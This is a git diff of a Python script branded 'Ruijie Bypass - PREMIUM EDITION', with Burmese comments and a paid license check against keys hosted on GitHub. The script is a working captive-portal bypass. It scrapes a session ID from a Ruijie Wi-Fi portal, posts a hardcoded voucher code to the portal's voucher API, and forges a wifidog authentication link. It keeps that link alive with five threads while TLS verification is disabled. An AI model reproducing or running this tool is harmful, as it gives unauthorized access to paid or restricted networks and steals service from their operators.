@@ -1,31 +1,35 @@
 import requests, re, urllib3, time, threading, os, random, subprocess, sys
 from urllib.parse import urlparse, parse_qs, urljoin
 
+# SSL Bypass
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- [Updated Link] ---
+# --- [GitHub Raw Link] ---
 RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/bypass-ruijie/refs/heads/main/Key.txt"
 LICENSE_FILE = "license.txt"
 
-# Standard Color Codes
-Y = "\033[1;33m" # Yellow
-G = "\033[1;32m" # Green
-R = "\033[1;31m" # Red
-W = "\033[1;37m" # White
-OFF = "\033[0m"  # Reset
+# --- SYSTEM COLORS (Native Termux Support) ---
+def col(c):
+    codes = {"Y": "\033[93m", "G": "\033[92m", "R": "\033[91m", 
+             "C": "\033[96m", "W": "\033[97m", "OFF": "\033[0m"}
+    return codes.get(c, "\033[0m")
 
 def banner():
     os.system('clear')
-    print(Y + " ="*35 + OFF)
-    # တစ်ကြောင်းချင်းစီ အရောင်သတ်မှတ်ခြင်း
-    print(Y + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + OFF)
-    print(Y + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + OFF)
-    print(G + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + OFF)
-    print(G + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + OFF)
-    print(R + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + OFF)
-    print(R + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + OFF)
-    print(f"        {R}✨ Ruijie Bypass - PREMIUM EDITION ✨{OFF}")
-    print(Y + " ="*35 + OFF + "\n")
+    # ၁။ အဝါရောင် အပေါ်စည်း
+    print(col("Y") + " ="*35 + col("OFF"))
+    
+    # ၂။ Ruijie Logo - အဝါ၊ အစိမ်း၊ အနီ တစ်ကြောင်းချင်းစီ Native Color သွင်းခြင်း
+    print(col("Y") + "      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗" + col("OFF"))
+    print(col("Y") + "      ██╔══██╗██║   ██║██║     ██║██║██╔════╝" + col("OFF"))
+    print(col("G") + "      ██████╔╝██║   ██║██║     ██║██║█████╗  " + col("OFF"))
+    print(col("G") + "      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  " + col("OFF"))
+    print(col("R") + "      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗" + col("OFF"))
+    print(col("R") + "      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝" + col("OFF"))
+    
+    # ၃။ အနီရောင် Premium Edition စာသား
+    print(f"        {col('R')}✨ Ruijie Bypass - PREMIUM EDITION ✨{col('OFF')}")
+    print(col("Y") + " ="*35 + col("OFF") + "\n")
 
 def get_hwid():
     try:
@@ -36,58 +40,93 @@ def get_hwid():
 def verify():
     hwid = get_hwid()
     banner()
+    
     if os.path.exists(LICENSE_FILE):
-        print(G + "[✓] Status: Active (Auto Login Success)" + OFF)
+        print(f"{col('G')}[✓] Status: Active (Auto Login Success){col('OFF')}")
         return True
+
     try:
-        print(W + "[*] Connecting to License Server..." + OFF)
+        print(f"{col('W')}[*] Connecting to License Server...{col('OFF')}")
         resp = requests.get(RAW_KEY_URL, timeout=10).text
-        print(W + "[+] DEVICE ID: " + Y + hwid + OFF)
-        key = input(Y + "[?] ENTER LICENSE KEY: " + OFF).strip()
+        print(f"{col('W')}[+] YOUR DEVICE ID: {col('Y')}{hwid}{col('OFF')}")
+        key = input(f"{col('Y')}[?] ENTER LICENSE KEY: {col('OFF')}").strip()
+        
         if f"{key}:{hwid}" in resp:
-            with open(LICENSE_FILE, "w") as f: f.write(key)
-            print(G + "[✓] Access Granted!" + OFF)
+            with open(LICENSE_FILE, "w") as f:
+                f.write(key)
+            print(f"{col('G')}[✓] Access Granted! License Saved.{col('OFF')}")
+            time.sleep(1)
             return True
         else:
-            print(R + "[!] Invalid Key." + OFF)
+            print(f"{col('R')}[!] Invalid Key or Unauthorized ID.{col('OFF')}")
             sys.exit()
     except:
+        print(f"{col('R')}[!] Server Error: Check Your Internet.{col('OFF')}")
         sys.exit()
 
+def check_net():
+    try:
+        return requests.get("http://www.google.com/generate_204", timeout=5).status_code == 204
+    except:
+        return False
+
 def high_speed_pulse(link):
+    session = requests.Session()
     while True:
         try:
-            requests.get(link, timeout=10, verify=False)
-            print(G + f"[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]      " + OFF, end="\r")
-        except: break
-        time.sleep(2)
+            session.get(link, timeout=10, verify=False)
+            # Bypass Status - အစိမ်းရောင်
+            print(f"{col('G')}[✓] Bypass Active | Pulse: [{random.randint(100,450)}ms]{col('OFF')}      ", end="\r")
+        except:
+            break
+        time.sleep(random.uniform(1.0, 2.5))
 
 def start_bypass():
-    print(W + "[*] Attempting to Capture Portal..." + OFF)
+    print(f"{col('C')}[*] Attempting to Capture Portal...{col('OFF')}")
+    session = requests.Session()
     while True:
         try:
-            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-            # အကယ်၍ internet ရှိနေရင်
-            if r.status_code == 204:
-                print(Y + "[•] Internet Connected. Monitoring...         " + OFF, end="\r")
+            if check_net():
+                print(f"{col('Y')}[•] Internet Connected. Monitoring...{col('OFF')}         ", end="\r")
                 time.sleep(10)
                 continue
+
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            r1 = session.get(r.url, verify=False, timeout=5)
             
-            # Capturing Logic...
-            r1 = requests.get(r.url, verify=False, timeout=5)
             match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             n_url = urljoin(r.url, match.group(1)) if match else r.url
-            sid = parse_qs(urlparse(requests.get(n_url, verify=False).url).query).get('sessionId', [None])[0]
+            r2 = session.get(n_url, verify=False, timeout=5)
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                print(G + f"[✓] SID Captured: {sid[:15]}..." + OFF)
-                print(R + "[*] ⚡ Launching Stability Pulse Threads... ⚡" + OFF)
-                # Thread စတင်ခြင်း
-                threading.Thread(target=high_speed_pulse, args=(n_url,), daemon=True).start()
-                while True: time.sleep(10)
-        except: time.sleep(5)
+                print(f"{col('G')}[✓] SID Captured: {sid[:15]}...{col('OFF')}")
+                p_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
+                
+                session.post(f"{p_host}/api/auth/voucher/", 
+                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
+                             timeout=10)
+                
+                gw = parse_qs(urlparse(r.url).query).get('gw_address', ['192.168.60.1'])[0]
+                port = parse_qs(urlparse(r.url).query).get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
+                
+                # Thread Start - အနီရောင်
+                print(f"{col('R')}[*] ⚡ Launching Stability Pulse Threads... ⚡{col('OFF')}")
+                for _ in range(5):
+                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
+                
+                while check_net():
+                    time.sleep(5)
+            else:
+                print(f"{col('R')}[!] SID Not Found. Retrying in 5s...{col('OFF')}")
+                time.sleep(5)
+        except:
+            time.sleep(3)
 
 if __name__ == "__main__":
     if verify():
-        try: start_bypass()
-        except: print(R + "\n[!] Stopped." + OFF)
+        try:
+            start_bypass()
+        except KeyboardInterrupt:
+            print(f"\n{col('R')}[!] Stopped by User.{col('OFF')}")
